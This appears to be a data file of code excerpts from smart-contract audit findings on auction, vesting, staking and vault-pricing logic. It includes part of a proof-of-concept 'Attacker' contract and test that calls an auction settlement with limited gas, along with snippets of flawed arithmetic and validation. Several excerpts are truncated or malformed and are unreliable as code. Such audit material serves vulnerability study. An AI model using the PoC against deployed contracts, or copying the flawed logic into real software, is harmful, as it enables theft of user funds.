bytes4(keccak256(""settleCurrentAndCreateNewAuction()""));\n        assembly {\n            let ptr := mload(0x40)\n            mstore(ptr, selector)\n            let success := call(1500000, target, 0, ptr, 4, 0, 0)\n        }\n    }\n}\n```\n```\npragma solidity 0.8.16;\n\nimport { NounsBuilderTest } from ""./utils/NounsBuilderTest.sol"";\nimport { MockERC721 } from ""./utils/mocks/MockERC721.sol"";\nimport { MockImpl } from ""./utils/mocks/MockImpl.sol"";\nimport { MockPartialTokenImpl } from ""./utils/mocks/MockPartialTokenImpl.sol"";\nimport { MockProtocolRewards } from ""./utils/mocks/MockProtocolRewards.sol"";\nimport { Auction } from ""../src/auction/Auction.sol"";\nimport { IAuction } from ""../src/auction/IAuction.sol"";\nimport { AuctionTypesV2 } from ""../src/auction/types/AuctionTypesV2.sol"";\nimport { TokenTypesV2 } from ""../src/token/types/TokenTypesV2.sol"";\nimport { Attacker } from ""./Attacker.sol"";\n\ncontract AuctionTest is NounsBuilderTest {\n    MockImpl internal mockImpl;\n    Auction internal rewardImpl;\n    Attacker internal attacker;\n    address internal bidder1;\n    address internal bidder2;\n    address internal referral;\n    uint16 internal builderRewardBPS = 300;\n    uint16 internal referralRewardBPS = 400;\n\n    function setUp() public virtual override {\n        super.setUp();\n        bidder1 = vm.addr(0xB1);\n        bidder2 = vm.addr(0xB2);\n        vm.deal(bidder1, 100 ether);\n        vm.deal(bidder2, 100 ether);\n        mockImpl = new MockImpl();\n        rewardImpl = new Auction(address(manager), address(rewards), weth, builderRewardBPS, referralRewardBPS);\n        attacker = new Attacker();\n    }\n\n    function test_POC() public {\n        address[] memory wallets = new address[](1);\n        uint256[] memory percents = new uint256[](1);\n        uint256[] memory vestingEnds = new uint256[](1);\n\n        // START OF SETUP\n        wallets[0] = founder;\n        percents[0] = 99;\n        vestingEnds[0] = 4 weeks;\n        setFounderParams(wallets, percents, vestingEnds);\n        setMockTokenParams();\n        setMockAuctionParams();\n        setMockGovParams();\n        deploy(foundersArr, tokenParams, auctionParams, govParams);\n        setMockMetadata();\n        // END OF SETUP\n\n        // Start auction contract and do the first auction\n        vm.prank(founder);\n        auction.un"
"```\nunchecked {\n    for (uint256 i = 0; i < claimCount; ++i) {\n        MerkleClaim memory claim = claims[i];\n\n        if (!MerkleProof.verify(claim.merkleProof, settings.merkleRoot, keccak256(abi.encode(claim.mintTo, claim.tokenId)))) {\n            revert INVALID_MERKLE_PROOF(claim.mintTo, claim.merkleProof, settings.merkleRoot);\n        }\n\n        IToken(tokenContract).mintFromReserveTo(claim.mintTo, claim.tokenId);\n    }\n}\n```\n```\n    proposal.voteStart = SafeCast.toUint32(snapshot);\n    proposal.voteEnd = SafeCast.toUint32(deadline);\n    proposal.proposalThreshold = SafeCast.toUint32(currentProposalThreshold);\n    proposal.quorumVotes = SafeCast.toUint32(quorum());\n    proposal.proposer = msg.sender;\n    proposal.timeCreated = SafeCast.toUint32(block.timestamp);\n\n    emit ProposalCreated(proposalId, _targets, _values, _calldatas, _description, descriptionHash, proposal);\n```\n```\nfunction quorum() public view returns (uint256) {\n    unchecked {\n        return (settings.token.totalSupply() * settings.quorumThresholdBps) / BPS_PER_100_PERCENT;\n    }\n}"
"```\nfunction _addFounders(IManager.FounderParams[] calldata _founders, uint256 reservedUntilTokenId) internal {\n    // Used to store the base token id the founder will recieve\n    uint256 baseTokenId = reservedUntilTokenId;\n\n    // For each token to vest:\n    for (uint256 j; j < founderPct; ++j) {\n        // Get the available token id\n        baseTokenId = _getNextTokenId(baseTokenId);\n\n        // Store the founder as the recipient\n        tokenRecipient[baseTokenId] = newFounder;\n\n        emit MintScheduled(baseTokenId, founderId, newFounder);\n\n        // Update the base token id\n        baseTokenId = (baseTokenId + schedule) % 100;\n    }\n}\n\nfunction _getNextTokenId(uint256 _tokenId) internal view returns (uint256) {\n    unchecked {\n        while (tokenRecipient[_tokenId].wallet!= address(0)) {\n            _tokenId = (_tokenId + 1) % 100;\n        }\n        return _tokenId;\n    }\n}\n```\n```\nfunction _isForFounder(uint256 _tokenId) private returns (bool) {\n    uint256 baseTokenId = _tokenId % 100;\n\n    if (tokenRecipient[baseTokenId].wallet == address(0)) {\n        return false;\n    } else if (block.timestamp < tokenRecipient[baseTokenId].vestExpiry) {\n        _mint(tokenRecipient[baseTokenId].wallet, _tokenId);\n        return true;\n    } else {\n        delete tokenRecipient[baseTokenId];\n        return false;\n    }\n}\n```\ncontract TokenStorageV1 is TokenTypesV1 {\n    /// @notice The token settings\n    internal Settings settings;\n\n    /// @notice The vesting details of a founder\n    /// @dev Founder id => Founder\n    mapping(uint256 => Founder) internal founder;\n\n    /// @notice The recipient of a token\n    /// @dev\n    mapping(uint256 => Founder) public tokenRecipient;\n}\n```\n```\nfunction test_lossFirst(address _minter, uint256 _reservedUntilTokenId, uint256 _tokenId) public {\n    deployAltMock(200);\n    (address wallet,,) = token.tokenRecipient(200);\n    assertEq(wallet, founder);\n}\n```\n```\n$ forge test -vvv --match-test test_lossFirst\n\nRunning 1 test for test/Token.t.sol:TokenTest\n[PASS] test_lossFirst(address,uint256,uint256) (runs: 256, μ: 3221578, ~: 3221578)\nTest result: ok. 1 passed; 0 failed; 0 skipped; finished in 355.45ms\nRan 1 test suite: 1 tests passed, 0 failed, 0 skipped (1 total tests)\n```"
"```\nfor (uint256 i; i < numRecipients; ) {\n    expectedTotalValue += amounts[i];\n\n    unchecked {\n        ++i;\n    }\n}\n\nif (msg.value!= expectedTotalValue) {\n    revert INVALID_DEPOSIT();\n}\n```\n```\nuint256 totalBPS = _founderRewardBps + referralRewardsBPS + builderRewardsBPS;\n\n// Calculate total rewards\nsplit.totalRewards = (_finalBidAmount * totalBPS) / BPS_PER_100_PERCENT;\n\n// Initialize arrays\nsplit.recipients = new address[](arraySize);\nsplit.amounts = new uint256[](arraySize);\nsplit.reasons = new bytes4[](arraySize);\n\n// Set builder reward\nsplit.recipients[0] = builderRecipient;\nsplit.amounts[0] = (_finalBidAmount * builderRewardsBPS) / BPS_PER_100_PERCENT;\n\n// Set referral reward\nsplit.recipients[1] = _currentBidRefferal!= address(0)? _currentBidRefferal : builderRecipient;\nsplit.amounts[1] = (_finalBidAmount * referralRewardsBPS) / BPS_PER_100_PERCENT;\n\n// Set founder reward if enabled\nif (hasFounderReward) {\n    split.recipients[2] = founderReward.recipient;\n    split.amounts[2] = (_finalBidAmount * _founderRewardBps) / BPS_PER_100_PERCENT;\n}\n```\n```\nsplit.totalRewards = (19000) / 100000 = 190 / 100 = 0.19\n\nsplit.amounts[0] = (9500) / 100000 = 95 / 100 = 0.95\nsplit.amounts[1] = (9500) / 100000 = 95 / 100 = 0.95\n```\n```\nif (split.totalRewards!= 0) {\n    rewardsManager.depositBatch(\n        value: split.totalRewards\n    )(split.recipients, split.amounts, split.reasons, """");\n}\n```"
"```\ndef _change_gauge_weight(addr: address, weight: uint256):\n    gauge_type: int128 = self.gauge_types_[addr] - 1\n    old_gauge_weight: uint256 = self._get_weight(addr)\n    type_weight: uint256 = self._get_type_weight(gauge_type)\n    old_sum: uint256 = self._get_sum(gauge_type)\n    _total_weight: uint256 = self._get_total()\n    next_time: uint256 = (block.timestamp + WEEK) / WEEK * WEEK\n\n    self.points_weight[addr][next_time].bias = weight\n    self.time_weight[addr] = next_time\n\n    new_sum: uint256 = old_sum + weight - old_gauge_weight\n    self.points_sum[gauge_type][next_time].bias = new_sum\n    self.time_sum[gauge_type] = next_time\n\n    _total_weight = _total_weight + new_sum * type_weight - old_sum * type_weight\n    self.points_total[next_time] = _total_weight\n    self.time_total = next_time\n\n    log(NewGaugeWeight(addr, block.timestamp, weight, _total_weight))\n```"
"```\nICommonStruct.TokenAmount[] memory bribeTokens = _sdtBlackHole.pullSdStakingBribes(\n    processor,\n    _processorRewardsPercentage\n);\n\nuint256 rewardAmount = _gaugeAsset.reward_count();\n\nICommonStruct.TokenAmount[] memory tokenAmounts = new ICommonStruct.TokenAmount[](\n    rewardAmount + bribeTokens.length\n);\n\nuint256 counter;\naddress _processor = processor;\nfor (uint256 j = 0; j < rewardAmount; j++) {\n    IERC20 token = _gaugeAsset.reward_tokens(j);\n    uint256 balance = token.balanceOf(address(this));\n    if (balance!= 0) {\n        uint256 fullBalance = balance;\n        token.transfer(sdtRewardsReceiver, balance);\n        tokenAmounts[counter++] = ICommonStruct.TokenAmount({token: token, amount: balance});\n    }\n}\n\nfor (uint256 j = 0; j < bribeTokens.length; j++) {\n    IERC20 token = bribeTokens[j].token;\n    uint256 amount = bribeTokens[j].amount;\n    if (amount!= 0) {\n        tokenAmounts[counter++] = ICommonStruct.TokenAmount({token: token, amount: amount});\n    }\n}\n```\n```\nfor (uint256 i; i < _rewardAssets.length; ) {\n    IERC20 _token = _rewardAssets[i].token;\n    uint256 erc20Id = _tokenToId[_token];\n    if (erc20Id == 0) {\n        uint256 _numberOfSdtRewards = ++numberOfSdtRewards;\n        _tokenToId[_token] = _numberOfSdtRewards;\n        erc20Id = _numberOfSdtRewards;\n    }\n\n    _sdtRewardsByCycle[_cvgStakingCycle][erc20Id] = ICommonStruct.TokenAmount({\n        token: _token,\n        amount: _rewardAssets[i].amount\n    });\n    unchecked {\n        ++i;\n    }\n}"
"```\nfunction delegateMgCvg(uint256 _tokenId, address _to, uint96 _percentage) external onlyTokenOwner(_tokenId) {\n    require(_percentage <= 100, ""INVALID_PERCENTAGE"");\n\n    uint256 _delegateesLength = delegatedMgCvg[_tokenId].length;\n    require(_delegateesLength < maxMgDelegatees, ""TOO_MUCH_DELEGATEES"");\n\n    uint256 tokenIdsDelegated = mgCvgDelegatees[_to].length;\n    require(tokenIdsDelegated < maxTokenIdsDelegated, ""TOO_MUCH_MG_TOKEN_ID_DELEGATED"");\n}\n```\n```\nit(""maxTokenIdsDelegated is reached => Cannot update percentage of delegate"", async function () {\n  (await lockingPositionDelegate.maxTokenIdsDelegated()).should.be.equal(25);\n  await lockingPositionDelegate.connect(treasuryDao).setMaxTokenIdsDelegated(3);\n  (await lockingPositionDelegate.maxTokenIdsDelegated()).should.be.equal(3);\n\n  await lockingPositionDelegate.connect(user1).delegateMgCvg(1, user10, 20);\n  await lockingPositionDelegate.connect(user2).delegateMgCvg(2, user10, 30);\n  await lockingPositionDelegate.connect(user3).delegateMgCvg(3, user10, 30);\n\n  const txFail = lockingPositionDelegate.connect(user1).delegateMgCvg(1, user10, 40);\n  await expect(txFail).to.be.revertedWith(""TOO_MUCH_MG_TOKEN_ID_DELEGATED"");\n});\n\nit(""maxTokenIdsDelegated IS DECREASED => PERCENTAGE UPDATE IS NO LONGER POSSIBLE"", async function () {\n  await lockingPositionDelegate.connect(treasuryDao).setMaxTokenIdsDelegated(25);\n  (await lockingPositionDelegate.maxTokenIdsDelegated()).should.be.equal(25);\n\n  await lockingPositionDelegate.connect(user1).delegateMgCvg(1, user10, 20);\n  await lockingPositionDelegate.connect(user2).delegateMgCvg(2, user10, 30);\n  await lockingPositionDelegate.connect(user3).delegateMgCvg(3, user10, 30);\n\n  await lockingPositionDelegate.connect(treasuryDao).setMaxTokenIdsDelegated(3);\n  (await lockingPositionDelegate.maxTokenIdsDelegated()).should.be.equal(3);\n\n  const txFail = lockingPositionDelegate.connect(user1).delegateMgCvg(1, user10, 40);\n  await expect(txFail).to.be.revertedWith(""TOO_MUCH_MG_TOKEN_ID_DELEGATED"");\n  await lockingPositionDelegate.connect(treasuryDao).setMaxTokenIdsDelegated(25);\n  (await lockingPositionDelegate.maxTokenIdsDelegated()).should.be.equal(25);\n});\n\nit(""maxMgDelegatees : TRY TO UPDATE PERCENTAGE DELEGATED TO A USER IF WE ALREADY REACH maxMgDelegatees"", async function () {\n  await lockingPositionDelegate.connect(tre"
"```\n(1,400,000 + 2 * 604,800) / 604,800 = 4\n\n4 * 604,800 = 2,419,200\n```\n```\n612,000 * 95 = 58,140,000\n```\n```\n612,000 * 96 = 58,060,800\n```"
"```\nif (isMint) {\n    cvgSdt.mint(receiver, rewardAmount);\n} else {\n    ICrvPoolPlain _poolCvgSDT = poolCvgSDT;\n    _poolCvgSDT.exchange(0, 1, rewardAmount, _poolCvgSDT.get_dy(0, 1, rewardAmount), receiver);\n}\n```\n```\n@view\n@external\ndef get_dy(\n    i: int128, \n    j: int128, \n    dx: uint256\n) -> uint256:\n    """"""\n    Calculate the current output dy given input dx\n    Index values can be found via the `coins` public getter method\n    @param i Index value for the coin to send\n    @param j Index value of the coin to receive\n    @param dx Amount of `i` being exchanged\n    @return Amount of `j` predicted\n    """"""\n    rates: uint256[N_COINS] = self.rate_multipliers\n    xp: uint256[N_COINS] = self._xp_mem(rates, self.balances)\n\n    x: uint256 = xp[i] + (dx * rates[i] / PRECISION)\n    y: uint256 = self.get_y(i, j, x, xp, 0, 0)\n    dy: uint256 = xp[j] - y - 1\n    fee: uint256 = self.fee * dy / FEE_DENOMINATOR\n    return (dy - fee) * PRECISION / rates[j]\n```"
```\nuint256 cvgLockAmount = (amount * ysPercentage) / MAX_PERCENTAGE;\nuint256 ysTotal = (lockDuration * cvgLockAmount) / MAX_LOCK;\n```\n```\nuint256 ysTotal = (\n    ((endCycle - startCycle) * amount * ysPercentage) / MAX_PERCENTAGE\n) / MAX_LOCK;\n```\n```\nstartCycle 357\nendCycle 420\nlockDuration 63\namount 2\nysPercentage 80\n```\n```\nuint256 cvgLockAmount = (2 * 80) / 100;\nuint256 ysTotal = (63 * 1) / 96;\n```\n```\nuint256 ysTotal = ((63 * 2 * 80) / 100) / 96;\n```
"```\nfunction _checkPriceAndCalculateValue() internal view override returns (uint256) {\n    (uint256[] memory balances, uint256[] memory spotPrices) = \n        SPOT_PRICE.getComposableSpotPrices(\n            BALANCER_POOL_ID,\n            address(BALANCER_POOL_TOKEN),\n            PRIMARY_INDEX()\n        );\n\n    (/* */, uint8[] memory decimals) = TOKENS();\n    for (uint256 i = 0; i < spotPrices.length; i++) {\n        spotPrices[i] = spotPrices[i] * POOL_PRECISION() / 10 ** decimals[i];\n    }\n\n    return _calculateLPTokenValue(balances, spotPrices);\n}\n```\n```\nFile: StableMath.sol\n\n/**\n * @dev Calculates the spot price of token Y in token X.\n */\nfunction _calcSpotPrice(\n    uint256 amplificationParameter,\n    uint256 invariant,\n    uint256 balanceX,\n    uint256 balanceY\n) internal pure returns (uint256) {\n    uint256 a = (amplificationParameter * 2) / _AMP_PRECISION;\n    uint256 b = invariant + a * (invariant - invariant);\n    uint256 numerator = 2 * a * balanceX * balanceY + a * balanceY * balanceY + b * balanceX * balanceX;\n    uint256 denominator = 2 * a * balanceX * balanceY + a * balanceX * balanceX + b * balanceY * balanceY;\n    return numerator / denominator;\n}\n```\n```\nfunction _calculateLPTokenValue(\n    uint256 price = _getOraclePairPrice(primaryToken, address(tokens[i]));\n\n    uint256 lowerLimit = price * (Constants.VAULT_PERCENT_BASIS - limit) / Constants.VAULT_PERCENT_BASIS;\n    uint256 upperLimit = price * (Constants.VAULT_PERCENT_BASIS + limit) / Constants.VAULT_PERCENT_BASIS;\n    if (spotPrices[i] < lowerLimit || upperLimit < spotPrices[i]) {\n        revert Errors.InvalidPrice(price, spotPrices[i]);\n    }\n```"
```\nfunction _isInvalidRewardToken(address token) internal override view returns (bool) {\n    return (\n        token == TOKEN_1 ||\n        token == TOKEN_2 ||\n        token == address(CURVE_POOL_TOKEN) ||\n        token == address(CONVEX_REWARD_POOL) ||\n        token == address(CONVEX_BOOSTER) ||\n        token == Deployments.ALT_ETH_ADDRESS\n    );\n}\n```\n```\nfunction _isInvalidRewardToken(address token) internal override view returns (bool) {\n    return (\n        token == TOKEN_1 ||\n        token == TOKEN_2 ||\n        token == TOKEN_3 ||\n        token == TOKEN_4 ||\n        token == TOKEN_5 ||\n        token == address(AURA_BOOSTER) ||\n        token == address(AURA_REWARD_POOL) ||\n        token == address(Deployments.WETH)\n    );\n}\n```
"```\nfunction restoreVault(\n    uint256 minPoolClaim,\n    bytes calldata /* data */\n) external override whenLocked onlyNotionalOwner {\n    StrategyVaultState memory state = VaultStorage.getStrategyVaultState();\n\n    (IERC20[] memory tokens, /* */) = TOKENS();\n    uint256[] memory amounts = new uint256[](tokens.length);\n\n    for (uint256 i = 0; i < tokens.length; i++) {\n        if (address(tokens[i]) == address(POOL_TOKEN())) continue;\n        amounts[i] = TokenUtils.tokenBalance(address(tokens[i]));\n    }\n\n    uint256 poolTokens = _joinPoolAndStake(amounts, minPoolClaim);\n}\n```\n```\ndef add_liquidity(amounts: uint256[N_COINS], min_mint_amount: uint256) -> uint256:\n    if token_supply > 0:\n        fee: uint256 = self.fee * N_COINS / (4 * (N_COINS - 1))\n        admin_fee: uint256 = self.admin_fee\n\n        for i in range(N_COINS):\n            ideal_balance: uint256 = D1 * old_balances[i] / D0\n            difference: uint256 = 0\n            if ideal_balance > new_balances[i]:\n                difference = ideal_balance - new_balances[i]\n            else:\n                difference = new_balances[i] - ideal_balance\n            fees[i] = fee * difference / FEE_DENOMINATOR\n            if admin_fee!= 0:\n                self.admin_balances[i] += fees[i] * admin_fee / FEE_DENOMINATOR\n            new_balances[i] -= fees[i]\n\n        D2 = self.get_D(new_balances, amp)\n        mint_amount = token_supply * (D2 - D0) / D0\n    else:\n        mint_amount = D1  # Take the dust if there was any\n```"
"```\nfunction _calculateInvariant(\n    uint256 amplificationParameter,\n    uint256[] memory balances,\n    bool roundUp\n) internal pure returns (uint256) {\n    unchecked {\n        uint256 sum = 0;\n        uint256 numTokens = balances.length;\n        for (uint256 i = 0; i < numTokens; i++) {\n            sum = sum.add(balances[i]);\n        }\n        if (sum == 0) {\n            return 0;\n        }\n\n        uint256 prevInvariant = 0;\n        uint256 invariant = sum;\n        uint256 ampTimesTotal = amplificationParameter * numTokens;\n\n        for (uint256 i = 0; i < 255; i++) {\n            uint256 P_D = balances[0] * numTokens;\n            for (uint256 j = 1; j < numTokens; j++) {\n                P_D = Math.div(Math.mul(Math.mul(P_D, balances[j]), numTokens), invariant, roundUp);\n            }\n            prevInvariant = invariant;\n            invariant = Math.div(\n                Math.mul(Math.mul(numTokens, invariant), invariant).add(\n                    Math.div(Math.mul(Math.mul(ampTimesTotal, sum), P_D), _AMP_PRECISION, roundUp)\n                ),\n                Math.mul(numTokens + 1, invariant).add(\n                    // No need to use checked arithmetic for the amp precision, the amp is guaranteed to be at least 1\n                    Math.div(Math.mul(ampTimesTotal - _AMP_PRECISION, P_D), _AMP_PRECISION,!roundUp)\n                ),\n                roundUp\n            );\n\n            if (invariant > prevInvariant) {\n                if (invariant - prevInvariant <= 1) {\n                    return invariant;\n                }\n            } else if (prevInvariant - invariant <= 1) {\n                return invariant;\n            }\n        }\n    }\n    revert CalculationDidNotConverge();\n}\n```\n```\nfunction _calculateStableMathSpotPrice(\n    uint256 ampParam,\n    uint256[] memory scalingFactors,\n    uint256[] memory balances,\n    uint256 scaledPrimary,\n    uint256 primaryIndex,\n    uint256 index2\n) internal pure returns (uint256 spotPrice) {\n    uint256 secondary = balances[index2] * scalingFactors[index2] / BALANCER_PRECISION;\n\n    uint256 invariant = StableMath._calculateInvariant(\n        ampParam,\n        StableMath._balances(scaledPrimary, secondary),\n        true // round up\n    );\n}\n```\nfunction _calculateInvariant(uint256 amplificationParameter, uint256[] memory balances)\n    internal\n    pure\n    returns (uint256) {\n    // Always round down, to match Vyper's arithmetic (which always truncates).\n}\n```"
"```\nfunction _checkPriceAndCalculateValue() internal view override returns (uint256) {\n    (uint256[] memory balances, uint256[] memory spotPrices) = \n        SPOT_PRICE.getComposableSpotPrices(\n            BALANCER_POOL_ID,\n            address(BALANCER_POOL_TOKEN),\n            PRIMARY_INDEX()\n        );\n\n    (/* */, uint8[] memory decimals) = TOKENS();\n    for (uint256 i = 0; i < spotPrices.length; i++) {\n        spotPrices[i] = spotPrices[i] * POOL_PRECISION() / 10 ** decimals[i];\n    }\n\n    return _calculateLPTokenValue(balances, spotPrices);\n}\n```\n```\nscaledPrimary = balances[USDC] * scalingFactors[USDC] / BALANCER_PRECISION\n\nscaledPrimary = (100 * 1e6 * 1e30) / 1e18\n\nscaledPrimary = 100 * 1e18\n\nscaledSecondary = balances[DAI] * scalingFactors[DAI] / BALANCER_PRECISION\n\nscaledSecondary = (100 * 1e18 * 1e18) / 1e18\n\nscaledSecondary = 100 * 1e18\n```\n```\nfunction _calculateStableMathSpotPrice(\n    uint256 ampParam,\n    uint256[] memory scalingFactors,\n    uint256[] memory balances,\n    uint256 scaledPrimary,\n    uint256 primaryIndex,\n    uint256 index2\n) internal pure returns (uint256 spotPrice) {\n    uint256 secondary = balances[index2] * scalingFactors[index2] / BALANCER_PRECISION;\n\n    uint256 invariant = StableMath._calculateInvariant(\n        ampParam, \n        StableMath._balances(scaledPrimary, secondary), \n        true // round up\n    );\n\n    spotPrice = StableMath._calcSpotPrice(ampParam, invariant, scaledPrimary, secondary);\n\n    spotPrice = spotPrice * scalingFactors[primaryIndex] / scalingFactors[index2];\n}\n```\n```\nspotPrice = spotPrice * scalingFactors[USDC] / scalingFactors[DAI]\n\nspot_price = (1e18 * 1e30) / 1e18\nspot_price = 1e30\nspot_price = 1e12 * 1e18\n```\n```\nspotPrice = {\n    ""USDC-Primary"": 0,\n    ""DAI-Secondary"": 1e12 * 1e18\n}\n```\nspotPrice[DAI-Secondary] = spotPrice[DAI-Secondary] * POOL_PRECISION / DAI_Decimal\n\nspotPrice[DAI-Secondary] = (1e12 * 1e18 * 1e18) / 1e18\nspotPrice[DAI-Secondary] = 1e12 * 1e18\n```\n```\nfunction _checkPriceAndCalculateValue() internal view override returns (uint256) {\n    (uint256[] memory balances, uint256[] memory spotPrices) = \n        SPOT_PRICE.getComposableSpotPrices(\n            BALANCER_POOL_ID,\n            address(BALANCER_POOL_TOKEN),\n            PRIMARY_INDEX()\n        );\n\n    (/* */, uint8[] memory decimals) = TOKENS();\n    for (uint256 i = 0; i < spotPrices.length; i++) {\n        spotPrices[i] = spotPrices[i] * POOL_PRECISION() / 10 ** decimals[i];\n    }\n\n    return _calculateLPTokenValue(balances, spotPrices);\n}\n```"
"```\nfunction _calculateStableMathSpotPrice(\n    //...SNIP...\n    // Apply scale factors\n    uint256 secondary = balances[index2] * scalingFactors[index2] / BALANCER_PRECISION;\n\n    uint256 invariant = StableMath._calculateInvariant(\n        ampParam, \n        StableMath._balances(scaledPrimary, secondary), \n        true // round up\n    );\n\n    spotPrice = StableMath._calcSpotPrice(ampParam, invariant, scaledPrimary, secondary);\n```\n```\npragma solidity ^0.8.0;\n\ncontract StableMath {\n    /**\n     * @dev Calculates the spot price of token Y in token X.\n     */\n    function _calcSpotPrice(\n        uint256 amplificationParameter,\n        uint256 invariant,\n        uint256 balanceX,\n        uint256 balanceY\n    ) internal pure returns (uint256) {\n        unchecked {\n            uint256 a = (amplificationParameter * 2) / _AMP_PRECISION;\n            uint256 b = Math.mul(invariant, a).sub(invariant);\n\n            uint256 axy2 = Math.mul(a * 2, balanceX).mulDown(balanceY);\n\n            // dx = a.x.y.2 + a.y^2 - b.y\n            uint256 derivativeX = axy2.add(Math.mul(a, balanceY).mulDown(balanceY)).sub(b.mulDown(balanceY));\n\n            // dy = a.x.y.2 + a.x^2 - b.x\n            uint256 derivativeY = axy2.add(Math.mul(a, balanceX).mulDown(balanceX)).sub(b.mulDown(balanceX));\n\n            // The rounding direction is irrelevant as we're about to introduce a much larger error when converting to log\n            // space. We use `divUp` as it prevents the result from being zero, which would make the logarithm revert. A\n            // result of zero is therefore only possible with zero balances, which are prevented via other means.\n            return derivativeX.divUp(derivativeY);\n        }\n    }\n}\n```\nuint256 b = Math.mul(invariant, a).sub(invariant);\n```"
"```\nfunction _calculateStableMathSpotPrice(\n    // Apply scale factors\n    uint256 secondary = balances[index2] * scalingFactors[index2] / BALANCER_PRECISION;\n\n    uint256 invariant = StableMath._calculateInvariant(\n        ampParam, StableMath._balances(scaledPrimary, secondary), true // round up\n    );\n\n    spotPrice = StableMath._calcSpotPrice(ampParam, invariant, scaledPrimary, secondary);\n```\n```\nfunction _calculateInvariant(uint256 amplificationParameter, uint256[] memory balances)\n    internal\n    pure\n    returns (uint256) {\n    /**********************************************************************************************\n    D = invariant\n    A = amplification coefficient\n    A  n^n S + D = A D n^n + -----------\n    S = sum of balances\n    n^n P\n    P = product of balances\n    n = number of tokens\n    *********************************************************************************************/\n}\n```\n```\nexport function _poolDerivatives(\n    A: BigNumber,\n    balances: OldBigNumber[],\n    tokenIndexIn: number,\n    tokenIndexOut: number,\n    is_first_derivative: boolean,\n    wrt_out: boolean\n): OldBigNumber {\n    const totalCoins = balances.length;\n    const D = _invariant(A, balances);\n```"
"```\nfunction reinvestReward(\n    SingleSidedRewardTradeParams[] calldata trades,\n    uint256 minPoolClaim\n) external whenNotLocked onlyRole(REWARD_REINVESTMENT_ROLE) returns (\n    address rewardToken,\n    uint256 amountSold,\n    uint256 poolClaimAmount\n) {\n    _checkPriceAndCalculateValue();\n\n    require(trades.length == NUM_TOKENS());\n    uint256[] memory amounts;\n    (rewardToken, amountSold, amounts) = _executeRewardTrades(trades);\n}\n```\nfunction executeRewardTrades(\n    IERC20[] memory tokens,\n    SingleSidedRewardTradeParams[] calldata trades,\n    address rewardToken,\n    address poolToken\n) external returns (uint256[] memory amounts, uint256 amountSold) {\n    amounts = new uint256[](trades.length);\n    for (uint256 i = 0; i < trades.length; i++) {\n        require(trades[i].sellToken == rewardToken);\n        if (trades[i].amount == 0) continue;\n        if (trades[i].buyToken == poolToken) continue;\n        require(trades[i].buyToken == address(tokens[i]));\n    }\n}\n```\n```\ntokens = [\n    ""crvUSD"",\n    ""WETH"",\n    ""CRV""\n]\n```\ntrades[0].sellToken[0] = CRV (rewardToken)\ntrades[0].buyToken = crvUSD\ntrades[0].amount = 1000\n\ntrades[1].sellToken[0] = CRV (rewardToken)\ntrades[1].buyToken = WETH\ntrades[1].amount = 1000\n\ntrades[1].sellToken[1] = CRV (rewardToken)\ntrades[1].buyToken = CRV\ntrades[1].amount = 0\n```\n```\nfunction _executeRewardTrades(SingleSidedRewardTradeParams[] calldata trades) internal returns (\n    address rewardToken,\n    uint256 amountSold,\n    uint256[] memory amounts\n) {\n    rewardToken = trades[0].sellToken;\n    if (_isInvalidRewardToken(rewardToken)) revert Errors.InvalidRewardToken(rewardToken);\n    (IERC20[] memory tokens, /* */) = TOKENS();\n    (amounts, amountSold) = StrategyUtils.executeRewardTrades(\n        tokens, trades, rewardToken, address(POOL_TOKEN())\n    );\n}\n```\n```\nfunction _isInvalidRewardToken(address token) internal override view returns (bool) {\n    return (\n        token == TOKEN_1 ||\n        token == TOKEN_2 ||\n        token == TOKEN_3 ||\n        token == TOKEN_4 ||\n        token == TOKEN_5 ||\n        token == address(AURA_BOOSTER) ||\n        token == address(AURA_REWARD_POOL) ||\n        token == address(Deployments.WETH)\n    );\n}\n```\n```\nfunction _isInvalidRewardToken(address token) internal override view returns (bool) {\n    return (\n        token == TOKEN_1 ||\n        token == TOKEN_2 ||\n        token == address(CURVE_POOL_TOKEN) ||\n        token == address(CONVEX_REWARD_POOL) ||\n        token == address(CONVEX_BOOSTER) ||\n        token == Deployments.ALT_ETH_ADDRESS\n    );\n}\n```"
"```\n@external\n@nonreentrant('lock')\ndef remove_liquidity_one_coin(\n    token_amount: uint256, \n    i: uint256, \n    min_amount: uint256, \n    use_eth: bool = False, \n    receiver: address = msg.sender\n) -> uint256:\n    A_gamma: uint256[2] = self._A_gamma()\n\n    dy: uint256 = 0\n    D: uint256 = 0\n    p: uint256 = 0\n    xp: uint256[N_COINS] = empty(uint256[N_COINS])\n    future_A_gamma_time: uint256 = self.future_A_gamma_time\n    dy, p, D, xp = self._calc_withdraw_one_coin(A_gamma, token_amount, i, future_A_gamma_time > 0, True)\n    assert dy >= min_amount, ""Slippage""\n\n    if block.timestamp >= future_A_gamma_time:\n        self.future_A_gamma_time = 1\n\n    self.balances[i] -= dy\n    CurveToken(self.token).burnFrom(msg.sender, token_amount)\n\n    coin: address = self.coins[i]\n    if use_eth and coin == WETH20:\n        raw_call(receiver, b"""", value=dy)\n    else:\n        if coin == WETH20:\n            WETH(WETH20).deposit(value=dy)\n        response: Bytes[32] = raw_call(\n            coin, \n            _abi_encode(receiver, dy, method_id=""transfer(address,uint256)""), \n            max_outsize=32\n        )\n        if len(response)!= 0:\n            assert convert(response, bool)\n```\n```\nfunction _unstakeAndExitPool(\n    ICurve2TokenPool pool = ICurve2TokenPool(CURVE_POOL);\n    uint256[2] memory exitBalances = new uint256[](2);\n    if (isSingleSided) {\n        // Redeem single-sided\n        exitBalances[_PRIMARY_INDEX] = pool.remove_liquidity_one_coin(\n            poolClaim, int8(_PRIMARY_INDEX), _minAmounts[_PRIMARY_INDEX]\n        );\n    } else {\n        // Redeem proportionally, min amounts are rewritten to a fixed length array\n        uint256[2] memory minAmounts;\n        minAmounts[0] = _minAmounts[0];\n        minAmounts[1] = _minAmounts[1];\n\n        uint256[2] memory _exitBalances = pool.remove_liquidity(poolClaim, minAmounts);\n        exitBalances[0] = _exitBalances[0];\n        exitBalances[1] = _exitBalances[1];\n    }\n```"
